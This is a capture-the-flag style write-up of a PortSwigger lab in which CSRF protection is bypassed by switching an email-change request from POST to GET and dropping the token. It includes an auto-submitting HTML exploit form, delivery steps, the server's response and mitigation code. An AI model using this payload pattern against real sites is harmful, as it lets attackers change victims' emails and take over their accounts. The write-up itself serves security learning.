# Lab 02: CSRF Where Token Validation Depends on Request Method

> **Topic**: CSRF Vulnerabilities
> **Lab Number**: 02
> **Platform**: PortSwigger Web Security Academy

## Category
CSRF — Token Bypass via Method Switching

## Vulnerability Summary
This lab has a CSRF token validation mechanism that only checks the token when the request is sent via POST. If you switch the request method to GET (and optionally remove the token entirely), the server skips validation and processes the request anyway. The exploit forces the victim's browser to send a GET-based email change request — no valid CSRF token required.

## Attack Methodology

### Step 1: Recon
Logged in with the provided credentials and navigated to the account page. Found an Update Email form that submits via POST:

```
POST /my-account/change-email
Host: 0a8a00060402ca72803e1c93004a0065.web-security-academy.net

email=test%40test.com&csrf=tS1JHUMFgzx9wJWw7R4IW3CGV7sO1y2E
```

Generated a CSRF PoC using Burp Suite Pro:
> Right-click the POST request → Engagement tools → Generate CSRF PoC

The default PoC kept the `csrf` token in the form and used `method="POST"`.

### Step 2: Understanding the Filter
Tested whether the server validates the token on POST — it does. Sending a request with a wrong/missing token on POST returns an error.

**Hypothesis**: The developer only added CSRF validation to the POST handler, assuming GET requests are safe. If the same endpoint accepts GET with query parameters, the token check is never triggered.

### Step 3: Switching Method to GET + Removing the Token
Modified the CSRF PoC in two ways:
- Changed `method="POST"` → `method="GET"`
- Removed the `csrf` hidden input field entirely

The resulting exploit:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8a00060402ca72803e1c93004a0065.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="hehe@gmail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

No `csrf` parameter. Method is GET. The form auto-submits on page load via the script tag.

### Step 4: Delivering the Exploit
- Pasted the PoC into the Exploit Server body
- Clicked **Store** then **View exploit** to confirm it worked on my own session (email changed → 302 redirect to `/my-account?id=wiener`)
- Clicked **Deliver exploit to victim**

### Step 5: Results
Burp Repeater confirmed the server returned:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The 302 redirect confirms the email change was accepted — no CSRF token required on GET.

## Technical Root Cause
The vulnerability exists because the server's CSRF protection is method-dependent:

```python
# ❌ Vulnerable implementation (pseudocode)
if request.method == "POST":
    validate_csrf_token(request)   # Only checks POST
process_email_change(request)      # Runs for ALL methods
```

The email change endpoint accepts both POST and GET. The CSRF middleware only hooks into POST handling. GET requests go straight through to the business logic with zero token validation.

### Why This Works

| Layer | POST Request | GET Request |
|-------|-------------|-------------|
| CSRF Middleware | ✅ Token validated | ❌ Skipped entirely |
| Email Change Logic | Runs if token valid | Always runs |
| Attacker's Exploit | Blocked (needs valid token) | Works without token |

The attacker simply avoids the POST path altogether. Since browsers automatically follow form GET submissions cross-origin, the victim's session cookie is sent along and the request is authenticated — just not CSRF-protected.

## Impact
- **Account Takeover (partial)**: Attacker can change victim's email address
- **Privilege Escalation**: With email changed, attacker can trigger password reset to their controlled inbox
- **No User Interaction Beyond Page Visit**: Victim only needs to visit the exploit page
- **Session Cookie Sufficient**: No credentials or tokens needed by the attacker

## Key Takeaways
1. **CSRF Protection Must Cover ALL Methods**: Developers often add CSRF checks only to POST handlers. If the same action is reachable via GET, the protection is useless.
2. **Always Test Method Switching**: When CSRF token validation blocks you on POST, immediately try GET. It's a one-second test in Burp Repeater that can bypass the entire protection.
3. **Remove the Token Too**: Even after switching to GET, remove the `csrf` parameter entirely. A missing token on an unchecked method confirms the server isn't validating at all — cleaner PoC.
4. **Burp's CSRF PoC Generator is a Starting Point**: The generated PoC uses POST by default. Always manually review and modify it — method switching is something the tool won't do for you.
5. **302 = Success**: When testing CSRF exploits, a `302 Found` redirect to the account page is your confirmation that the action was accepted server-side.
6. **Real-World Impact is Severe**: Email change → password reset → full account takeover. What looks like a minor CSRF becomes a complete account compromise chain.

## Mitigation

### 1. Validate CSRF Token on ALL State-Changing Methods
```python
# ❌ Bad - only checks POST
if request.method == "POST":
    validate_csrf_token(request)

# ✅ Good - checks all state-changing methods
if request.method in ["POST", "PUT", "PATCH", "DELETE", "GET"]:
    if is_state_changing_action(request):
        validate_csrf_token(request)
```

### 2. Reject GET Requests for State-Changing Actions
```python
# ✅ Best - state-changing endpoints should never accept GET
if request.method != "POST":
    return 405  # Method Not Allowed
```

### 3. Use SameSite Cookie Attribute
```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

### 4. Double Submit Cookie Pattern
```javascript
// Include CSRF token in both cookie and request parameter
// Server validates they match — works for all methods
```

### 5. Framework-Level Enforcement
```python
# Django example - enforce CSRF on all methods
@csrf_protect  # Apply globally, not per-method
def change_email(request):
    ...
```
